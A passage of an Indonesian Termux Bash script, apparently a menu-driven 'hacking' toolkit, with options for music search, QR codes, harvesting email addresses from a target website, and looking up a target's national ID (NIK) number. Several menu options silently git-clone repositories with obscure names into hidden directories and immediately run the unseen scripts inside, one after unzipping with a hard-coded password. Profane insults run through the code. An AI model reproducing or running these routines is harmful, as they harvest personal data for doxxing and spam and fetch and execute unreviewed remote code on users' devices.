if [ -n "$alamat" ]; then
    echo " [+] Alamat         : $alamat"
else
    echo " [+] Alamat         : Tidak tersedia"
fi
email=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"email":"[^"]*"' | grep -o '"email":"[^"]*"' | head -1 | sed 's/"email":"//;s/"//g')
if [ -n "$email" ]; then
    echo " [+] Email          : $email"
else
    echo " [+] Email          : Tidak tersedia"
fi
kode_pos=$(echo "$raw" | grep -oP '"kode_pos":"\K[^"]+' | head -1)
if [ -n "$kode_pos" ]; then
    echo " [+] Kode Pos       : $kode_pos"
else
    echo " [+] Kode Pos       : Tidak tersedia"
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "11" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
show_loading() {
    local pid=$1
    local i=0
    while kill -0 $pid 2>/dev/null; do
        printf "\r${c}${chars[i]}${g} Mencari lagu..!!"
        i=$(( (i+1) % ${#chars[@]} ))
        sleep 0.1
    done
    printf "\r${g}✓ Pencarian selesai !! \n"
}
durasi() {
    local seconds=$1
    if [[ $seconds =~ ^[0-9]+$ ]]; then
        local min=$((seconds / 60))
        local sec=$((seconds % 60))
        printf "%02d:%02d" $min $sec
    else
        echo "00:00"
    fi
}
shorten() {
    local title="$1"
    echo "$title" | awk '{print $1 " " $2 " " $3 " " $4}' | sed 's/ $//'
}
echo "
███████╗██████╗ ████████╗██╗   ██╗
██╔════╝██╔══██╗╚══██╔══╝╚██╗ ██╔╝
███████╗██████╔╝   ██║    ╚████╔╝ 
╚════██║██╔═══╝    ██║     ╚██╔╝  
███████║██║        ██║      ██║   
╚══════╝╚═╝        ╚═╝      ╚═╝
    Developer : Thxyzz404   " | lolcat 
echo ""
read -p "$(echo -e "${y}Masukkan pencarian ${r}[ ${g}SPTY ${r}]${c} : ")" cari
echo ""
if [ -z "$cari" ]; then
    clear 
    echo ""
    echo -e "${r} Pilih yang bener kontol :v "
    echo ""
fi
echo ""
echo -e "${b}🔍 Mencari : ${n}$cari"
echo -e "${g}=============================================="
temp_file="./.search_results_temp_$$"
{
    yt-dlp "ytsearch5:$cari" \
        --print "%(title)s|%(id)s|%(duration)s" \
        --no-warnings 2>/dev/null > "$temp_file"
} &
pid=$!
show_loading $pid
wait $pid
if [ -f "$temp_file" ]; then
    results=$(cat "$temp_file")
    rm -f "$temp_file"
else
    results=""
fi
if [ -z "$results" ]; then
    clear 
    echo ""
    echo -e "${r}Lagu tidak di temukan : " $cari
    echo ""
fi
echo ""
echo -e "${g}📋 HASIL PENCARIAN "
echo -e "${c}┌────┬────────────────────────────┬──────────┐${n}"
echo -e "${c}│ No │ Judul                      │ Durasi   │${n}"
echo -e "${c}├────┼────────────────────────────┼──────────┤${n}"
counter=1
while IFS='|' read -r title id duration; do
    short=$(shorten "$title")
    dur=$(durasi "$duration")
    printf "${c}│${n} %2d ${c}│${n} %-26s ${c}│${n} %7s ${c}│${n}\n" "$counter" "$short" "$dur"
    counter=$((counter + 1))
done <<< "$results"
echo -e "${c}└────┴────────────────────────────┴──────────┘${n}"
echo ""
echo -ne "${y}🎯 Pilih nomor lagu : "
read han
id=$(echo "$results" | sed -n "${han}p" | cut -d'|' -f2 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
tel=$(echo "$results" | sed -n "${han}p" | cut -d'|' -f1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
if [ -z "$id" ]; then
    clear 
    echo ""
    echo -e "${r} Pilihan anda tidak valid."
    echo ""
fi
echo ""
echo -e "${g}✅ Lagu dipilih : ${p}$(shorten "$tel") "
echo ""
echo -ne "${b}▶️  Apakah ingin memutar lagu? (y/n) : "
read play
if [[ "$play" =~ ^[Yy]$ ]]; then
    clear
    echo -e "${c}🎵 MEMUTAR LAGU 🎵 "
    echo -e "${r}=========================================="
    echo -e "${b}Judul : ${y}$(shorten "$tel")"
    echo -e "${r}=========================================="
    echo ""
    mpv --no-video \
        --quiet \
        --terminal=no \
        --msg-level=all=no \
        --no-osd-bar \
        --osd-level=0 \
        "https://youtu.be/$id" 2>/dev/null &    
    MPV_PID=$!
    echo -e "${r}[ ${g}✓ ${r}]${c} Memutar lagu."
    echo ""
    echo -e "${b}Tekan Ctrl+C untuk berhenti."
    echo ""
    i=0
    while kill -0 $MPV_PID 2>/dev/null; do
        printf "\r${c}${chars[$i]} Memutar... "
        i=$(( (i+1) % ${#chars[@]} ))
        sleep 0.2
    done
    printf "\r${g}✓ Pemutaran selesai. \n"
else
    echo ""
    echo -e "${p}⏹️  Pemutaran dibatalkan."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "12" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
banner() {
echo -e "${r}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣶⠿⠟⠛⠉⠉⠉⠉⠉⠙⠛⠻⢷⣦⣄⠀⠀⠀⠀
⠀⠀⢀⣴⠾⠛⠉⢀⣀⣤⣤⣶⣶⣶⣶⣶⣶⣤⣤⣀⠈⠙⠻⣦⡀⠀
⠀⠀⠟⠁⢀⣤⣾⢿⡿⠛${g}⣿⣿⣿⠋⠀${r}⡉⠻⣿⣷⣦⡀⠈⠻⠀
⠀⠀⢀⣴⡿⠋⠁⣾⠁⠀${g}⣿⣿⣿⣦⣤⣴⡇${r}⠀⢹⡍⠛⣿⣦⠀⠀
⠀⣰⣿⠋⠀⠀⠀⣿⡀⠀${g}⣿⣿⣿⣿⣿⡿⠃${r}⠀⣼⠇⠀⠈⢻⣷⡀
⣼⣿⡇⠀⠀⠀⠀⠹⣷⣀ ${g}⠙⠛⠛⠋${r}⠀⢀⣴⠟⠀⠀⠀⠀⣿⣷
⠻⢿⣿⣦⣀⠀⠀⠀⠈⠛⢷⣦⣤⣤⣤⣤⣶⠟⠋⠀⠀⢀⣠⣾⡿⠿
⠀⠀⠀⠉⠛⠿⣶⣤⣤⣀⣀⠀⢉⠉⢉⣁⣀⣀⣤⣴⡶⠿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⣀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠋⠉⠀⢀⡀⠀⠀⠀⠀
⠀⠀⠀⠀${c}⣴⡿${c}⣧⠀⠀⠀⠀ ⢠⣿⡄⠀⠀⠀⠀⢀⣾⢿⣆⠀⠀⠀
⠀⠀⠀⣼⡟${c}⠀⢹⣧⠀⠀⠀⣠⡿⠛⣿⡄⠀⠀⠀⣼⠏⠈⢿⡆⠀⠀
⠀⠀⠀⣿⡁${c}⠀⢀⣿⠀⠀⢠⣿⠁⠀⠘⣿⡀⠀⠀⣿⠀⠀⢸⡷⠀⠀
⠀⠀⠀⠹⣷⣤⣾⠏⠀⠀⣸⡇⡄⠀⠀⢻⣇⠀⠀⠻⣷⣴⡾⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⡻⢤⢀⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
domain() {
echo "$1" | sed -e 's|^[^/]*//||' -e 's|/.*$||'
}
email() {
echo "$1" | grep -E -o '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
}
link() {
local html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$1" 2>/dev/null)
local str="" 
if [ -n "$html" ]; then
local semua=$(echo "$html" | grep -E -o 'href="[^"]*"' | sed 's/href="//g' | sed 's/"//g' | head -10)   
for link in $semua; do
local absolut       
if [[ "$link" == http://* ]] || [[ "$link" == https://* ]]; then
     absolut="$link"
elif [[ "$link" == /* ]]; then
local protocol=$(echo "$1" | grep -E -o '^https?://')
local domain=$(domain "$1")
     absolut="${protocol}${domain}${link}"
else
     absolut="${1%/}/$link"
  fi   
str="$str $absolut"
done
fi
echo "$str"
}
scrape() {
local url="$1"
echo -e "${b}Scraping halaman utama : $url"
local html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$url" 2>/dev/null)
if [ -n "$html" ]; then
local emails=$(email "$html")
for email in $emails; do
local found=0
for e in "${DAFTAR_EMAIL[@]}"; do
if [ "$e" = "$email" ]; then
     found=1
break
fi
done            
if [ $found -eq 0 ]; then
    DAFTAR_EMAIL+=("$email")
fi
done        
URL_DIKUNJUNGI+=("$url")
HALAMAN_SEKARANG=1
local semua_link=$(link "$url")
local links_array=($semua_link)
local total_links=${#links_array[@]}        
echo -e "${g}Menemukan ${n}: ${r}$total_links ${y}link untuk di-scrape"
local count=1
for link in $semua_link; do
if [ -n "$link" ]; then
local sudah_dikunjungi=0
for u in "${URL_DIKUNJUNGI[@]}"; do
if [ "$u" = "$link" ]; then
   sudah_dikunjungi=1
break
fi
done                
if [ $sudah_dikunjungi -eq 0 ] && [ $HALAMAN_SEKARANG -lt $TOTAL_HALAMAN ]; then
echo -e "${y}Scraping link ${n}: ${c}$count/$total_links: $link"                    
local link_html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$link" 2>/dev/null)   
if [ -n "$link_html" ]; then
local link_emails=$(email "$link_html")                      
for email in $link_emails; do
local email_found=0
for e in "${DAFTAR_EMAIL[@]}"; do
if [ "$e" = "$email" ]; then
    email_found=1
break
fi
done                          
if [ $email_found -eq 0 ]; then
   DAFTAR_EMAIL+=("$email")
fi
done                       
URL_DIKUNJUNGI+=("$link")
fi                    
HALAMAN_SEKARANG=$((HALAMAN_SEKARANG + 1))
count=$((count + 1))
if [ $TOTAL_HALAMAN -gt 0 ]; then
local progres=$((HALAMAN_SEKARANG * 100 / TOTAL_HALAMAN))
if [ $progres -gt 100 ]; then
    progres=100
fi                        
local panjang=20
local panjang_terisi=$((panjang * progres / 100))
local panjang_kosong=$((panjang - panjang_terisi))                        
local bar="["
 for ((i=0; i<panjang_terisi; i++)); do
     bar="${bar}#"
done                       
 for ((i=0; i<panjang_kosong; i++)); do
     bar="${bar}."
done                        
     bar="${bar}] ${progres}%"
echo -e "${n}"                  
echo -ne "\rProses Scraping Alamat Email $bar"
     fi
  fi
fi
done       
echo -ne "\r"
 for ((i=0; i<100; i++)); do
 echo -n " "
 done
 echo -ne "\r"
fi
}
total() {
    local html_content=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$1" 2>/dev/null)  
    if [ -n "$html_content" ]; then
        local jumlah_link=$(echo "$html_content" | grep -E -o 'href="[^"]*"' | wc -l)
        if [ $jumlah_link -gt 20 ]; then
            TOTAL_HALAMAN=15
        elif [ $jumlah_link -gt 10 ]; then
            TOTAL_HALAMAN=$((jumlah_link / 2 + 1))
        else
            TOTAL_HALAMAN=$((jumlah_link + 1))
        fi
        if [ $TOTAL_HALAMAN -lt 2 ]; then
            TOTAL_HALAMAN=2
        fi
    else
        TOTAL_HALAMAN=5
    fi
}
mulai() {
    banner
    echo ""
    echo -e "${p}Development ${c}: ${g}By.Thxyzz404"
    echo -e "${g}"
    echo -n "[?] Masukkan Url Website Target : "
    read URL_TARGET  
    if [ "$URL_TARGET" = "exit" ] || [ "$URL_TARGET" = "EXIT" ]; then
        clear 
        echo ""
        echo -e "${p}Terima kasih By.Thxyzz404"
        echo ""
    fi    
    if ! [[ "$URL_TARGET" == http://* ]] && ! [[ "$URL_TARGET" == https://* ]]; then
        URL_TARGET="https://$URL_TARGET"
    fi    
    echo ""
    echo -e "${g}Memulai scraping : ${c}$URL_TARGET"
    echo ""
    URL_DIKUNJUNGI=()
    DAFTAR_EMAIL=()
    TOTAL_HALAMAN=0
    HALAMAN_SEKARANG=0
    total "$URL_TARGET"    
    echo -e "${p}Total halaman yang akan di-scrape : ${r}$TOTAL_HALAMAN"
    echo ""
    scrape "$URL_TARGET"
    echo -e "${g}Scraping selesai..!!"
    echo ""  
    if [ ${#DAFTAR_EMAIL[@]} -gt 0 ]; then
        echo -e "${r}[ ${g}INFO ${r}]${c} ${#DAFTAR_EMAIL[@]} Alamat Email Berhasil Diambil..!!"
        echo ""
        for email in "${DAFTAR_EMAIL[@]}"; do
            echo -e "${r}[ ${g}+ ${r}]${g} $email"
        done
    else
        echo -e "${r}[ ${g}X ${r}]${y} Tidak Ada Email Ditemukan..!!"
    fi   
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Total Halaman Web Yang Telah Di Gali : ${r}${#URL_DIKUNJUNGI[@]}"
    echo -e "${b}" 
    echo -n "ENTER Untuk Kembali Ke Awal Atau EXIT Untuk Keluar : "
    read pilihan    
    if [ "$pilihan" = "exit" ] || [ "$pilihan" = "EXIT" ]; then
        clear 
        echo ""
        echo -e "${p}Terima kasih By.Thxyzz404"
        echo ""
    fi
}
mulai
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "13" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
c='\033[1;36m'
n='\033[0m'
install_package() {
    local pkg="$1"
    if command -v "$pkg" >/dev/null 2>&1; then
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg belum terinstall, sedang menginstall..!!"
        sleep 2
        echo -e "${n}"
        apt-get install -y "$pkg"
    fi
}
install_pip_package() {
    local pkg="$1"
    if pip show "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (pip) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (pip) belum terinstall, sedang menginstall..!!"
        sleep 2
        pip install "$pkg"
    fi
}
install_npm_package() {
    local pkg="$1"
    if npm list -g "$pkg" | grep "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (npm) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (npm) belum terinstall, sedang menginstall..!!"
        sleep 1
        npm install -g "$pkg"
    fi
}
clear
echo ""
echo -e "${g}Memulai proses instalasi..!!"
sleep 2
clear
echo ""
echo -e "${c}Update dan upgrade system..!!"
echo -e "${n}"
apt-get update -y
apt-get upgrade -y
clear 
main_packages=(
    "python" "coreutils" "ncurses-utils" "python-pip" "nodejs" "bc" "ruby"
    "openssl-tool" "xz-utils" "bzip2" "boxes" "jq" "figlet" "toilet"
)
clear
echo ""
echo -e "${c}Menginstall packages utama..!!"
echo -e "${n}"
for pkg in "${main_packages[@]}"; do
    install_package "$pkg"
done
additional_packages=(
    "ossp-uuid" "vim" "tree" "cmake" "nodejs-lts"
    "clang" "make"
)
clear
echo ""
echo -e "${c}Menginstall packages tambahan..!!"
echo -e "${n}"
for pkg in "${additional_packages[@]}"; do
    install_package "$pkg"
done
clear
echo ""
echo -e "${c}Menginstall npm packages..!!"
echo -e "${n}"
install_npm_package "bash-obfuscate"
clear
echo ""
echo -e "${c}Menginstall Python packages..!!"
echo -e "${n}"
install_pip_package "rich"
install_pip_package "rich-cli"
clear
echo ""
echo -e "${g}Proses instalasi selesai!"
sleep 2 
clear 
echo ""
echo -e "${y}Membersihkan cache..!!"
echo -e "${n}"
apt-get autoremove -y
apt-get clean
clear
echo ""
echo -e "${c}Verifikasi instalasi${n}"
echo "=========================="
echo -e "${g}"
tools=("python" "node" "npm" "pip" "vim" "clang")
for tool in "${tools[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo -e "${g}✓ $tool berhasil diinstall${n}"
    else
        echo -e "${r}✗ $tool gagal diinstall${n}"
    fi
done
echo ""
echo -e "${r}Semua package telah berhasil diinstall!"
echo ""
sleep 4 
clear 
echo ""
echo -e "${g} Membuka fitur create botz telegram..!!"
echo ""
xdg-open https://t.me/BotFather
sleep 4
clear 
echo ""
echo -e "${r} PERINGATAN IKUTI LANGKAH-LANGKAH TERSEBUT."
echo ""
echo ""
echo -e "${r}[ ${g}1. ${r}]${c} Pilih menu ${g}: ${y}/start"
echo -e "${r}[ ${g}2. ${r}]${c} Pilih menu ${g}: ${y}/newbot"
echo -e "${r}[ ${g}3. ${r}]${c} Masukkan printah ${g}: ${y}Namabotzlu_bot"
echo -e "${r}[ ${g}4. ${r}]${c} Harus di awali nama botz ${r}[ ${g}_bot ${r}]"
echo -e "${r}[ ${g}5. ${r}]${c} Terakhir cek ID botz di ${g}: ${r}@CekIDTelegram_bot"
echo ""
echo -e "${g}Tekan Enter Untuk Melanjutkannya."
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
echo ""
echo -e "${g}>>> MENJALANKAN TOOLSNYA !! <<< "
echo ""
sleep 2
cok="$HOME/kocol0421galaxymekdecodertai999-goyangbnghahaha404"
if [ -d "$cok" ]; then
cd "$cok"
bash Galery_Eyes.sh
else
cd $HOME
git clone --depth 32 https://github.com/Wewokdetoknotoline/kocol0421galaxymekdecodertai999-goyangbnghahaha404
cd "$cok"
bash Galery_Eyes.sh
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "14" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.boboy0421galaxymekdecodertai086-goyangbnghahaha404"
PEJU="Goblok.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/Wewokdetoknotoline/.boboy0421galaxymekdecodertai086-goyangbnghahaha404 "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/Wewokdetoknotoline/.boboy0421galaxymekdecodertai086-goyangbnghahaha404 "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "15" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
package() {
if ! command -v jq > /dev/null 2>&1; then
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Beberapa package belum terinstall. Sedang menginstall..!!"
sleep 2
echo -e "${g}"
pkg install jq wget curl cowsay ruby php python python2 python3 -y
gem install lolcat
clear
fi
}
package 
echo "" 
echo -e "${r}[ ${g}✓ ${r}]${g} Semua package berhasil diinstal..!!" 
sleep 2
echo ""
bacot() {
echo "
██████╗  ██████╗ ██╗  ██╗     ███╗   ██╗██╗██╗  ██╗
██╔══██╗██╔═══██╗╚██╗██╔╝     ████╗  ██║██║██║ ██╔╝
██║  ██║██║   ██║ ╚███╔╝█████╗██╔██╗ ██║██║█████╔╝ 
██║  ██║██║   ██║ ██╔██╗╚════╝██║╚██╗██║██║██╔═██╗ 
██████╔╝╚██████╔╝██╔╝ ██╗     ██║ ╚████║██║██║  ██╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝"
echo ""
}
echo ""
clear
bacot | lolcat
echo -e "${g}"
read -p "Masukkan NIK Target Anda : " niknya_kontol
echo ""
clear
bacot | lolcat
if ! command -v nik-parse &> /dev/null; then
    echo -e "${r}Package Belum Terinstall, Menginstall Dulu..!!"
    sleep 2
    echo ""
    cd /data/data/com.termux/files/usr/include/ || mkdir -p /data/data/com.termux/files/usr/include/ && cd /data/data/com.termux/files/usr/include/
    git clone --depth 32 https://github.com/QrwszXnXnchommed0e56/Nik-Osint &> /dev/null
    cd Nik-Osint || exit
    unzip -o -P "トンキシズトミカン" Nik-404.sh &> /dev/null
    git stash &> /dev/null
    git pull origin main &> /dev/null
    npm install -g nik-parse &> /dev/null
fi
echo -e "${g}Sedang Memproses Data..!!"
echo ""
for i in {1..10}; do
echo -ne "\r${y}Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
sleep 0.3
done
echo -ne "\r${y}Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
echo -e "\n${r}Data Berhasil Diproses..!!"
sleep 1
echo -e "${g}"
nik-parse -n "$niknya_kontol"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "16" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.ajgtaibangkekbngsatsetantolkontololjmboatpjue"
PEJU="Cok.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "17" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
SAVE_DIR="/sdcard/GENERATOR_QR"
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y}${c} Memeriksa modul Python..!!"
    sleep 2
    echo ""
    if ! python3 -c "import pyqrcode, png, PIL, qrcode" &> /dev/null; then
        echo -e "${r}[ ${g}! ${r}]${y}${c} Menginstall modul yang diperlukan..!!"
        echo ""
        pip install pyqrcode pypng pillow qrcode 2>/dev/null || \
        pip3 install pyqrcode pypng pillow qrcode 2>/dev/null
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} ${c}Modul berhasil diinstall."
    else
        echo -e "${r}[ ${g}✓ ${r}]${y} ${c}Semua modul sudah terinstall."
    fi
    echo ""
    sleep 2
    clear
generate_qr_code() {
clear 
echo "
 ██████╗ ██████╗  ██████╗
██╔═══██╗██╔══██╗██╔════╝
██║   ██║██████╔╝██║     
██║▄▄ ██║██╔══██╗██║     
╚██████╔╝██║  ██║╚██████╗
 ╚══▀▀═╝ ╚═╝  ╚═╝ ╚═════╝" | lolcat
    echo ""
    echo -e "${p}Development ${c}: ${g}Thxyzz404"
    echo -e "${g}"
    read -p "Masukkan teks anda : " babi
    echo -e "${c}"
    if [ -z "$babi" ]; then
        clear 
        echo ""
        echo -e "${r} Teks tidak boleh kosong."
        sleep 3
        generate_qr_code
        return
    fi
    read -p "Masukkan nama file : " tod
    if [ -z "$tod" ]; then
        filename="qrcode_gue"
    else
        filename="${tod}"
    fi
    echo ""
    echo -e "${y}Sabar ajg lagi proses..!!"
    echo -e "${g}"
    mkdir -p "$SAVE_DIR"    
    python3 -c "
import os
import sys
import time
import qrcode
try:
    data = '''$babi'''
    filename = '''$filename'''
    save_dir = '''$SAVE_DIR'''
    full_path = os.path.join(save_dir, filename + '.png')    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    print('Preview Hasil QR')
    qr.print_ascii()
    img = qr.make_image(fill_color=\"black\", back_color=\"white\")
    img.save(full_path)
    print(f'\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[33;1m QR code disimpan sebagai : {filename}.png')
    print(f'\033[31;1m[ \033[32;1m+ \033[31;1m]\033[35;1m Lokasi file : {full_path}')
    file_size = os.path.getsize(full_path)
    print(f'\033[31;1m[ \033[32;1m@ \033[31;1m]\033[34;1m Ukuran file : {file_size} bytes')
except Exception as e:
    print(f'Error: {e}')
    sys.exit(1)
"
    if [ $? -ne 0 ]; then
        echo ""
        echo -e "${y} Gagal membuat QR code."
        sleep 2
        return
    fi
    echo -e "${y}"
    read -p "Apakah anda ingin membuat QR code lagi? [ y/n ] : " yatim
    if [ "$yatim" = "n" ] || [ "$yatim" = "N" ]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Keluar dari tools."
        echo ""
    else
        generate_qr_code
    fi
}
generate_qr_code
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "18" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
n='\033[0m'
command -v unzip >/dev/null 2>&1 || { echo "Menginstall unzip..."; pkg install unzip -y; }
command -v figlet >/dev/null 2>&1 || { echo "Menginstall figlet..."; pkg install figlet -y; }
clear
echo ""
echo "
⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣄⡀⠀⠀⠀⠀
 ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠙⠯⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⡆
